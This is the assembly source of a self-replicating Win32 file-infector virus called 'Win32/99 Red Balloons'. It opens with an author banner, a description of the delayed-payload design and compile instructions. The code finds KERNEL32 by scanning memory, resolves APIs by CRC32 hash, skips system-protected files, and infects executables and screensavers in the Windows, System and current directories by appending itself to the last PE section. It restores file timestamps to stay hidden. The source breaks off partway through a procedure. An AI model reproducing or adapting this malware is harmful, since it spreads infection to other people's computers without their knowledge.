;
; Tokugawa  Ieyasu...
; Proudly presents...
;
;
;    ÜÜÜ   ÜÜÜ
;   Û   Û Û   Û    ÛßßÜ Ûßßß ÛßßÜ   ÛßßÜ ÛßÜ  Û   Û   ÜßßßÜ ÜßßßÜ ÛÜ  Û Üßßß
;    ßßßÛ  ßßßÛ    ÛÜÜß Ûßß  Û  Û   ÛÜÜß Û  Û Û   Û   Û   Û Û   Û Û Û Û ßÜ
;    ÜÜÜß  ÜÜÜß    Û  Û ÛÜÜÜ ÛÜÜß   ÛÜÜß ÛßßÛ ÛÜÜ ÛÜÜ ßÜÜÜß ßÜÜÜß Û  ßÛ   ßÜ
;                                                                  ÜÜÜÜÜÜÜÜß
;   (Win32/99 Red Balloons)
;
;
; Ú±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±± DISCLAIMER ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
; ±                                                                          ±
; ± THE AUTHOR OF THIS VIRUS ISN'T RESPONSIBLE OF ANY DAMAGE THAT MAY HAPPEN ±
; ±          TO BOTH SOFTWARE AND HARDWARE  AFTER COMPILE THIS FILE          ±
; ±                                                                          ±
; ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±Ù
;
;
; ²²² Presentation ²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²
;
;   Here you have the  first virus I baptize with the name of a song. As this
;   is my third (actually  second) virus  in asm, don't expect new things, or
;   even new  routines. The  only new  thing I  wrote  for this virus was the
;   behaviour. Study it carefully, and you'll discover how a virus can become
;   into a  dormant infectious agent that can travel unnoticed inside certain
;   PE files.
;
;   Here are some technical characteristics:
;       - Entirely  developed  and tested  under MS Windows 2000 Professional
;       - 4827 bytes  long (99RB  doesn't  add  a  fixed  size  to   infected
;         files, it will vary depending on certain circumstances)
;       - Win32
;       - Direct Action
;       - CRC32 protected
;       - SEH protected
;       - Anti-*
;       - Infects five files in Windows, five in System Directory and five in
;         the current directory by increasing the last section
;
;
;   You can, as always, contact me at these directions:
;
;        E-mail:                                             tokugawa@host.sk
;           URL:                                       http://ieyasu.host.sk/
;           IRC:                  Undernet: #vxers
;                             OpenProjects: #virus #seguridad_redes #win32asm
;                              IRC-Hispano: #virus #seguridad_redes #win32asm
;
;
; ²²² Author's fast description ²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²
;
;   I'll  explain here only  the payload  (and  related code)  because  other
;   functions are  very similar  from  my Win32.Seppuku  virus (v1.0 & v1.1).
;   The  truth is that the  payload of this virus is not a great payload, but
;   I'm very proud of the code behind it, so, I'll explain you how it works.
;
;   First of  all, the virus will check the name of the infected computer, if
;   it's the same computer  as the  last time, the virus checks the payload's
;   conditions, if  not, the new  computer  name is  stored (as well  as  the
;   current date of the system) and the computer is now infected.
;   While  checking the conditions for the payload, a very important thing is
;   the date, if four months have passed from the first infection the payload
;   can appear, but  there is a  curious characteristic. The four months I've
;   talked  about are  taken together with the day, so the payload only would
;   be shown when CurrMonth - OrigMonth = 4 and CurrDay >= OrigDay. But there
;   is another  thing that the  virus  must check  before payloads, a  random
;   number. Even  when  the date  is the  appropiate,  there  will be only  a
;   probability of 25% for the  payloads to  be shown (I don't wanna warn the
;   user). And when  all this things are made, and the payload is going to be
;   shown, the text that will appear will depend on time, check out the hours
;   yourself.
;
;   As you  can see, the virus  won't show a message  every time it executes,
;   only in a  short period of time (and  even  then, there  are a few  extra
;   conditions it must pass), and  this way, Win32/99 Red Balloons.4827,  can
;   become into a dormant infectious agent without showing anything (only the
;   boring alert window from AVP misnaming it as Win32.Seppuku.4827).
;   
;
; ²²² Why this name? ²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²
;
;   Simply because I love the song. Nothing more than this.
;
;
; ²²² Greetings ²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²
;
;   This virus is dedicated to my best friend. She knows who she is.
;
;   IMPORTANT NOTE FOR KASPERSKY'S PEOPLE: All of you should learn to read!!!
;
;
; ²²² Compiling instructions ²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²
;
;   tasm32 -m5 -ml 99RB.asm
;   tlink32 -Tpe -aa 99RB.obj,99RB.exe,,Import32.lib
;   pewrsec 99RB.exe
;

                .386p
                .model flat
                jumps


; °°°°°°°°°°°°°°°°°°°° Some useful equates  for the virus °°°°°°°°°°°°°°°°°°°°

        RB_Len          equ     (offset RB_End - offset RB_Start)


; °°°°°°°°°°°°°°°°°°°° Imported APIs for first generation °°°°°°°°°°°°°°°°°°°°

        extrn   ExitProcess :proc
        extrn   MessageBoxA :proc


; °°°°°°°°°°°°°°°°°°° Dummy data for first generation only °°°°°°°°°°°°°°°°°°°

                .data

        sz_Title     db    'Win32/99 Red Balloons (c) 2002 Tokugawa Ieyasu',0
        sz_Message   db    '99 Red Balloons is now in your system',0


; °°°°°°°°°°°°°°°°°°°°°°°°°°°°°°° Virus start °°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°

                .code

RB_Start        label   byte
RB:             call    Delta
                xor     eax, eax
                mov     esp, [esp + 08h]
                pop     dword ptr fs:[eax]
                mov     ebp, [esp]
                add     esp, 04h
                sub     ebp, (offset Delta - 17h)
                jmp     StartWork
Delta:          xor     eax, eax
                push    dword ptr fs:[eax]
                mov     dword ptr fs:[eax], esp
                div     edx

                jmp     Host


; ÄÄ´ Calculate the CRC32 of the virus ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

StartWork:      lea     esi, dword ptr [ebp + CRC_Start]
                mov     edi, (Data_Start - CRC_Start)
                call    CRC32
                cmp     eax, 0F6B5C07Ah
                jne     Host


CRC_Start:      pop     ebx
                push    esp
                dec     edi
                dec     ebx
                push    ebp
                pop     ebp
                inc     ebx
                inc     edi
                pop     esp
                push    ebx


; ÄÄ´ Get KERNEL32.dll base address and store it ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

                mov     esi, [esp]
                and     esi, 0FFFF0000h
                call    KrnlAddress

                inc     eax
                je      Host
                mov     dword ptr [ebp + offset Kernel32], esi

; ÄÄ´ Get some APIs from KERNEL32.dll ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

                mov     edx, esi
                lea     esi, dword ptr [ebp + offset crc_k32Apis_Start]
                lea     edi, dword ptr [ebp + offset ad_k32Apis_Start]
Next_k32:       mov     ecx, [esi]
                push    esi edi
                xor     eax, eax
                mov     dword ptr [ebp + Address], eax
                mov     dword ptr [ebp + Names], eax
                mov     dword ptr [ebp + Ordinals], eax
                mov     dword ptr [ebp + Counter], eax
                call    GetDLLFunct
                pop     edi esi

                inc     eax
                jz      Host
                dec     eax
                stosd

                add     esi, 04h
                cmp     byte ptr [esi], 0FFh
                jne     Next_k32


; ÄÄ´ Get USER32.dll base address ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

Get_USER32:     lea     eax, dword ptr [ebp + offset sz_User32]
                push    eax
                call    dword ptr [ebp + offset ad_LoadLibraryA]

                xchg    eax, ecx
                jecxz   NoPayload
                mov     dword ptr [ebp + offset ad_User32], ecx
                mov     dword ptr [ebp + offset CanPayload], 01h

; ÄÄ´ Get some APIs from USER32.dll ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

GetUser32:      lea     edi, dword ptr [ebp + offset ad_MessageBoxA]
                lea     esi, dword ptr [ebp + offset sz_MessageBoxA]
                push    esi
                push    dword ptr [ebp + ad_User32]
                call    dword ptr [ebp + ad_GetProcAddress]

                or      eax, eax
                je      NoPayload
                stosd
                jmp     Get_SFC

NoPayload:      mov     dword ptr [ebp + offset CanPayload], 00h


; ÄÄ´ Get SFC.dll base address ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

Get_SFC:        lea     eax, dword ptr [ebp + offset sz_SFC]
                push    eax
                call    dword ptr [ebp + offset ad_LoadLibraryA]

                xchg    eax, ecx
                jecxz   NoSFC
                mov     dword ptr [ebp + offset ad_SFC], ecx
                mov     dword ptr [ebp + offset CanSFC], 01h

; ÄÄ´ Get some APIs from SFC.dll ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

GetSFC:         lea     edi, dword ptr [ebp + offset ad_SfcIsFileProtected]
                lea     esi, dword ptr [ebp + offset sz_SfcIsFileProtected]
                push    esi
                push    dword ptr [ebp + ad_SFC]
                call    dword ptr [ebp + ad_GetProcAddress]

                or      eax, eax
                je      NoSFC
                stosd
                jmp     Check_Pays

NoSFC:          mov     dword ptr [ebp + offset CanSFC], 00h


; ÄÄ´ Check for payloads ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

Check_Pays:     cmp     dword ptr [ebp + CanPayload], 00h
                je      Get_CurrDir

                lea     edi, [ebp + offset SystemTime]
                push    edi
                call    dword ptr [ebp + offset ad_GetSystemTime]

                lea     eax, dword ptr [ebp + offset ComputerLength]
                lea     ebx, dword ptr [ebp + offset CurrentComputerName]
                push    eax ebx
                call    dword ptr [ebp + offset ad_GetComputerNameA]

                lea     edi, dword ptr [ebp + ComputerName]
                lea     esi, dword ptr [ebp + CurrentComputerName]
                repe    cmpsb
                je      Payloads

                lea     edi, [ebp + offset SystemTime]
                mov     ax, word ptr [edi.ST_wMonth]
                mov     [ebp + offset Birth_Month], ax
                mov     ax, word ptr [edi.ST_wDay]
                mov     [ebp + offset Birth_Day], ax

                lea     eax, dword ptr [ebp + offset ComputerLength]
                lea     ebx, dword ptr [ebp + offset ComputerName]
                push    eax ebx
                call    dword ptr [ebp + offset ad_GetComputerNameA]
                jmp     Get_CurrDir

Payloads:       lea     edi, [ebp + offset SystemTime]
                mov     ax, word ptr [edi.ST_wMonth]
                mov     bx, word ptr [ebp + offset Birth_Month]

                add     bx, 04h
                cmp     bx, 0Ch
                jbe     TestMonth

                sub     bx, 0Ch
TestMonth:      cmp     bx, ax
                je      TestDay
                jmp     Get_CurrDir

TestDay:        mov     ax, word ptr [edi.ST_wDay]
                mov     bx, word ptr [ebp + offset Birth_Day]

                cmp     ax, bx
                jae     Pays
                jmp     Get_CurrDir

Pays:           lea     edi, [ebp + offset SystemTime]
                mov     eax, dword ptr [edi.ST_wMilliseconds]

                mov     ecx, 41C64E6Dh
                mul     ecx
                add     eax, 00003039h
                and     eax, 7FFFFFFFh

                cmp     eax, 20000000h
                jbe     ShowPays
                jmp     Get_CurrDir

ShowPays:       mov     ax, word ptr [edi.ST_wHour]

                cmp     ax, 0Ah
                je      Pay01
                cmp     ax, 0Ch
                je      Pay02
                cmp     ax, 0Eh
                je      Pay03
                cmp     ax, 10h
                je      Pay04
                cmp     ax, 12h
                je      Pay05
                jmp     Get_CurrDir

Pay01:          lea     eax, [ebp + offset @Title]
                lea     ebx, [ebp + offset @@@1st]
                push    40h eax ebx 00h
                call    dword ptr [ebp + offset ad_MessageBoxA]
                jmp     Get_CurrDir
Pay02:          lea     eax, [ebp + offset @Title]
                lea     ebx, [ebp + offset @@@2nd]
                push    40h eax ebx 00h
                call    dword ptr [ebp + offset ad_MessageBoxA]
                jmp     Get_CurrDir
Pay03:          lea     eax, [ebp + offset @Title]
                lea     ebx, [ebp + offset @@@3rd]
                push    40h eax ebx 00h
                call    dword ptr [ebp + offset ad_MessageBoxA]
                jmp     Get_CurrDir
Pay04:          lea     eax, [ebp + offset @Title]
                lea     ebx, [ebp + offset @@@4th]
                push    40h eax ebx 00h
                call    dword ptr [ebp + offset ad_MessageBoxA]
                jmp     Get_CurrDir
Pay05:          lea     eax, [ebp + offset @Title]
                lea     ebx, [ebp + offset @@@5th]
                push    40h eax ebx 00h
                call    dword ptr [ebp + offset ad_MessageBoxA]


; ÄÄ´ Get current directory ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

Get_CurrDir:    lea     eax, dword ptr [ebp + Current_Directory]
                push    eax Max_Path
                call    dword ptr [ebp + offset ad_GetCurrentDirectoryA]

                or      eax, eax
                jz      Host


; ÄÄ´ Infect Windows directory ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

Inf_WinDir:     lea     eax, dword ptr [ebp + Windows_Directory]
                push    Max_Path eax
                call    dword ptr [ebp + offset ad_GetWindowsDirectoryA]

                or      eax, eax
                jz      Inf_SysDir

                lea     eax, dword ptr [ebp + Windows_Directory]
                push    eax
                call    dword ptr [ebp + offset ad_SetCurrentDirectoryA]

                or      eax, eax
                jz      Inf_SysDir

                mov     dword ptr [ebp + offset Infections_Limit], 05h
                call    InfectDir


; ÄÄ´ Infect System directory ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

Inf_SysDir:     lea     eax, dword ptr [ebp + System_Directory]
                push    Max_Path eax
                call    dword ptr [ebp + offset ad_GetSystemDirectoryA]

                or      eax, eax
                jz      Inf_CurrDir

                lea     eax, dword ptr [ebp + System_Directory]
                push    eax
                call    dword ptr [ebp + offset ad_SetCurrentDirectoryA]

                or      eax, eax
                jz      Inf_CurrDir

                mov     dword ptr [ebp + offset Infections_Limit], 05h
                call    InfectDir


; ÄÄ´ Infect current directory ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

Inf_CurrDir:    lea     eax, dword ptr [ebp + Current_Directory]
                push    eax
                call    dword ptr [ebp + offset ad_SetCurrentDirectoryA]

                or      eax, eax
                jz      Host

                mov     dword ptr [ebp + offset Infections_Limit], 05h
                call    InfectDir


; ÄÄ´ Return to host ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

Host:           mov     ecx, ebp
                jecxz   FirstGen_Host
                mov     eax, [ebp + offset Host_ImageBase]
                add     eax, [ebp + offset Host_OldIP]
                jmp     eax


; °°°°°°°°°°°°°°°°°°°°°°°°°°°°° Procedures  area °°°°°°°°°°°°°°°°°°°°°°°°°°°°°


   KrnlAddress  proc
; ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
; ³ Input:                                                                   ³
; ³       mov   esi, [esp]                                                   ³
; ³       and   esi, 0FFFF0000h                                              ³
; ³                                                                          ³
; ³ Output:                                                                  ³
; ³       Kernel  base address  in ESI, or  EAX  equal  to 0FFFFFFFFh if the ³
; ³       function fails.                                                    ³
; ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

K32_SEH:        xor     eax, eax
                lea     ebx, dword ptr [ebp + offset K32_Handler]
                push    ebx
                push    dword ptr fs:[eax]
                mov     dword ptr fs:[eax], esp

Kernel_Loop:    cmp     word ptr [esi], 'ZM'
                je      Check_PE

Following_Page: sub     esi, 1000h
                jmp     Kernel_Loop

Check_PE:       mov     edi, [esi + 3Ch]
                add     edi, esi
                cmp     word ptr [edi], 'EP'
                je      Kernel_Found
                jmp     Following_Page

Kernel_Found:   xor     eax, eax
                pop     dword ptr fs:[eax]
                add     esp, 04h
                ret

K32_Handler:    xor     eax, eax
                mov     esp, [esp + 08h]
                pop     dword ptr fs:[eax]
                dec     eax
                add     esp, 04h
                ret

KrnlAddress     endp
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   GetDLLFunct  proc
; ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
; ³ Input:                                                                   ³
; ³       edx: dll base address                                              ³
; ³       ecx: CRC32 of the API                                              ³
; ³                                                                          ³
; ³ Output:                                                                  ³
; ³       API address  in EAX, or  EAX equal  to 0FFFFFFFFh if the  function ³
; ³       fails.                                                             ³
; ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

GetDLL_SEH:     xor     eax, eax
                mov     ebx, offset GetDLL_Handle
                add     ebx, ebp
                push    ebx
                push    dword ptr fs:[eax]
                mov     dword ptr fs:[eax], esp

                mov     ebx, edx
                add     ebx, [ebx + 3Ch]
                mov     ebx, [ebx + 78h]
                add     ebx, edx
                add     ebx, 1Ch

                mov     esi, ebx
                lodsd
                add     eax, edx
                mov     dword ptr [ebp + Address], eax
                lodsd
                add     eax, edx
                push    eax
                mov     dword ptr [ebp + Names], eax
                lodsd
                add     eax, edx
                mov     dword ptr [ebp + Ordinals], eax

                pop     esi

Next_API:       push    esi
                lodsd
                add     eax, edx
                xchg    edi, eax
                mov     ebx, edi

                push    edi
                xor     al, al
Next_Byte:      scasb
                jnz     Next_Byte
                pop     esi
                sub     edi, ebx
                push    ecx
                push    edx
                call    CRC32
                pop     edx
                pop     ecx
                cmp     ecx, eax
                jz      API_Found
                pop     esi
                add     esi, 04h
                inc     word ptr [ebp + Counter]
                jmp     Next_API

API_Found:      pop     esi
                movzx   eax, word ptr [ebp + Counter]
                shl     eax, 1
                add     eax, dword ptr [ebp + Ordinals]
                xor     esi, esi
                xchg    eax, esi
                lodsw
                shl     eax, 2
                add     eax, dword ptr [ebp + Address]
                xchg    esi, eax
                lodsd
                add     eax, edx
                xor     ebx, ebx
                pop     dword ptr fs:[ebx]
                add     esp, 04h
                ret

GetDLL_Handle:  xor     eax, eax
                mov     esp, [esp + 08h]
                pop     dword ptr fs:[eax]
                dec     eax
                add     esp, 04h
                ret
GetDLLFunct     endp
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   InfectDir    proc
; ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
; ³ Input:                                                                   ³
; ³       Nothing                                                            ³
; ³                                                                          ³
; ³ Output:                                                                  ³
; ³       Nothing                                                            ³
; ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

                lea     eax, dword ptr [ebp + offset WIN32_FIND_DATA]
                push    eax
                lea     eax, dword ptr [ebp + Search_Mask]
                push    eax
                call    dword ptr [ebp + offset ad_FindFirstFileA]

                inc     eax
                jz      Fail_Infection
                dec     eax
                mov     dword ptr [ebp + Search_Handle], eax

Infect:         lea     esi, dword ptr [ebp + WFD_szFileName]

__Loop:         lodsb
                or      al, al
                jz      __EndLoop
                jmp     __Loop

__EndLoop:      sub     esi, 05h
                lodsd
                or      eax, 20202020h

                cmp     eax, 'exe.'
                je      Check_SFC
                cmp     eax, 'rcs.'
                je      Check_SFC
                jmp     Next_File

Check_SFC:      cmp     dword ptr [ebp + CanSFC], 01h
                jne     BeginInfection

                push    dword ptr [ebp + WFD_szFileName] 00h
                call    dword ptr [ebp + ad_SfcIsFileProtected]

                or      eax, eax
                je      BeginInfection
                jmp     Next_File

BeginInfection: mov     eax, dword ptr [ebp + WFD_nFileSizeLow]
                cmp     eax, 2800h
                jbe     Next_File

                push    dword ptr [ebp + Host_OldIP]
                push    dword ptr [ebp + Host_ImageBase]
                call    Infect_File
                pop     dword ptr [ebp + Host_ImageBase]
                pop     dword ptr [ebp + Host_OldIP]

                jc      Next_File
                dec     dword ptr [ebp + Infections_Limit]
                cmp     dword ptr [ebp + Infections_Limit], 00h
                je      Close_Search

Next_File:      xor     al, al
                mov     ecx, Max_Path
                lea     edi, dword ptr [ebp + WFD_szFileName]
                rep     stosb

                lea     eax, dword ptr [ebp + offset WIN32_FIND_DATA]
                push    eax
                push    dword ptr [ebp + Search_Handle]
                call    dword ptr [ebp + offset ad_FindNextFileA]

                or      eax, eax
                jnz     Infect

Close_Search:   push    dword ptr [ebp + Search_Handle]
                call    dword ptr [ebp + offset ad_FindClose]

Fail_Infection: ret

InfectDir       endp
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   Infect_File  proc
; ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
; ³ Input:                                                                   ³
; ³       Nothing                                                            ³
; ³                                                                          ³
; ³ Output:                                                                  ³
; ³       Nothing                                                            ³
; ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

                mov     dword ptr [ebp + offset Inf_Flag], 0FFh
Save_Atts:      lea     esi, dword ptr [ebp + WFD_szFileName]
                push    esi
                call    dword ptr [ebp + offset ad_GetFileAttributesA]

                inc     eax
                jz      Set_Atts
                dec     eax
                mov     dword ptr [ebp + offset File_Attributes], eax

Set_Atts:       lea     edi, dword ptr [ebp + WFD_szFileName]
                push    80h edi
                call    dword ptr [ebp + offset ad_SetFileAttributesA]

                call    Open_File
                inc     eax
                jz      Open_Error
                dec     eax
                mov     dword ptr [ebp + offset File_Handle], eax

Save_Times:     mov     eax, offset File_LastWriteTime
                add     eax, ebp
                push    eax
                mov     eax, offset File_LastAccessTime
                add     eax, ebp
                push    eax
                mov     eax, offset File_CreationTime
                add     eax, ebp
                push    eax
                push    dword ptr [ebp + offset File_Handle]
                call    dword ptr [ebp + offset ad_GetFileTime]

                mov     ecx, dword ptr [ebp + WFD_nFileSizeLow]
                call    FileMapping
                or      eax, eax
                jz      Close_File
                mov     dword ptr [ebp + Map_Handle], eax

                mov     ecx, dword ptr [ebp + offset WFD_nFileSizeLow]
                call    ViewOfFile
                or      eax, eax
                jz      Unmap_File
                mov     dword ptr [ebp + offset Map_Address], eax

Check_EXE:      cmp     word ptr [eax], 'ZM'
                jne     No_Infection

Check_DOS:      cmp     word ptr [eax + 08h], 04h
                jne     No_Infection

Check_Infected: cmp     word ptr [eax + 38h], 'BR'
                jz      No_Infection

CheckPE:        mov     esi, [eax + 3Ch]
                add     esi, eax
                cmp     word ptr [esi], 'EP'
                jnz     No_Infection

Save_Align:     push    dword ptr [esi + 3Ch]

                push    dword ptr [ebp + Map_Address]
                call    dword ptr [ebp + offset ad_UnmapViewOfFile]
                push    dword ptr [ebp + Map_Handle]
                call    dword ptr [ebp + offset ad_CloseHandle]

                pop     ecx

                mov     eax, dword ptr [ebp + WFD_nFileSizeLow]
                add     eax, RB_Len

                call    Align_Size
                xchg    ecx, eax

                call    FileMapping
                or      eax, eax
                jz      Close_File
                mov     dword ptr [ebp + Map_Handle], eax

                mov     ecx, dword ptr [ebp + File_NewSize]
                call    ViewOfFile
                or      eax, eax
                jz      Unmap_File
                mov     dword ptr [ebp + Map_Address], eax

PE_Header:      mov     esi, [eax + 3Ch]
                add     esi, eax
                mov     edi, esi

Last_Section:   movzx   eax, word ptr [edi + 06h]
                dec     eax
                imul    eax, eax, 28h
                add     esi, eax
                add     esi, 78h
                mov     edx, [edi + 74h]
                shl     edx, 03h
Save_Pointer:   add     esi, edx

Save_IP:        mov     eax, [edi + 28h]
                mov     dword ptr [ebp + Host_OldIP], eax
Save_ImageBase: mov     eax, [edi + 34h]
                mov     dword ptr [ebp + Host_ImageBase], eax

                mov     edx, [esi + 10h]
Old_Raw_Size:   mov     ebx, edx
                add     edx, [esi + 14h]

                push    edx

                mov     eax, ebx
                add     eax, [esi + 0Ch]

Set_NewIP:      mov     [edi + 28h], eax
Save_NewIP:     mov     dword ptr [ebp + Host_NewIP], eax

                mov     eax, [esi + 10h]
                add     eax, RB_Len
                mov     ecx, [edi + 3Ch]
                call    Align_Size

                mov     [esi + 10h], eax
                mov     [esi + 08h], eax

                pop     edx

                mov     eax, [esi + 10h]
                add     eax, [esi + 0Ch]
                mov     [edi + 50h], eax

Set_Flags:      or      dword ptr [esi + 24h], 0A0000020h

                mov     eax, dword ptr [ebp + Map_Address]
Infection_Mark: mov     word ptr [eax + 38h], 'BR'

                lea     esi, [ebp + RB_Start]
                xchg    edi, edx

                mov     ebx, edi
                add     ebx, dword ptr [ebp + Map_Address]

                mov     edi, ebx
                mov     ecx, RB_Len
                rep     movsb

                mov     dword ptr [ebp + offset Inf_Flag], 00h
                jmp     Unmap_File

No_Infection:   mov     ecx, dword ptr [ebp + WFD_nFileSizeLow]
                call    Truncate_File

Unmap_File:     push    dword ptr [ebp + Map_Address]
                call    dword ptr [ebp + offset ad_UnmapViewOfFile]

Close_Map:      push    dword ptr [ebp + Map_Handle]
                call    dword ptr [ebp + offset ad_CloseHandle]

Close_File:     mov     eax, offset File_LastWriteTime
                add     eax, ebp
                push    eax
                mov     eax, offset File_LastAccessTime
                add     eax, ebp
                push    eax
                mov     eax, offset File_CreationTime
                add     eax, ebp
                push    eax
                push    dword ptr [ebp + File_Handle]
                call    dword ptr [ebp + offset ad_SetFileTime]

                push    dword ptr [ebp + File_Handle]
                call    dword ptr [ebp + offset ad_CloseHandle]

Open_Error:     push    dword ptr [ebp + WFD_dwFileAttributes]
                lea     eax, [ebp + WFD_szFileName]
                push    eax
                call    dword ptr [ebp + offset ad_SetFileAttributesA]
                jmp     Success

ErrorInfection: stc
                jmp     Proc_End

Success:        cmp     dword ptr [ebp + offset Inf_Flag], 0FFh
                je      ErrorInfection
                clc

Proc_End:       ret

Infect_File     endp
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   CRC32        proc
; ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
; ³ Input:                                                                   ³
; ³       esi: offset where code to calculate begins                         ³
; ³       edi: size of that code                                             ³
; ³                                                                          ³
; ³ Output:                                                                  ³
; ³       CRC32 of given code in EAX                                         ³
